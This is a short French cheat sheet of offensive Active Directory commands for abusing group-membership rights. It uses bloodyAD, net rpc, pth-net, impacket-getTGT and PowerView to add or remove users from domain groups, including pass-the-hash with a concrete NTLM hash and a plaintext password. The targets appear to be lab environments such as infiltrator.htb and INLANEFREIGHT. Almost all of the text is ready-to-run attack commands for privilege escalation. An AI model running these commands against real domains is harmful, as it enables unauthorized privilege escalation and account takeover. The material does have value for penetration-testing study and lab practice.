
> [!TIP]
> Permet d'ajouter / supprimer un membre Ã  un groupe

# LINUX

## BloodyAD

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
```

kerberos

Pass the hash to get krbtgt

```
sudo impacket-getTGT infiltrator.htb/e.rodriguez -hashes aad3b435b51404eeaad3b435b51404ee:b02e97f2fdb5c3d36f77375383449e56 -dc-ip dc01.infiltrator.htb
```

AddSelf on target

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -k add groupMember "$TargetGroup" "$TargetUser"
```

## Net rpc

```bash
net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
```

Pass the hash

```bash
pth-net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
```


# WINDOWS

## PowerView

1. S'authentifier avec le compte ayant les droits

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

2. Importer PowerView

```powershell
Import-Module .\PowerView.ps1
```

3. Ajouter le user au groupe

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

4. Confirmer l'ajout du user

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

5. Supprimer le user du groupe

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

6.  Confirmer la suppression du user dans le groupe

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

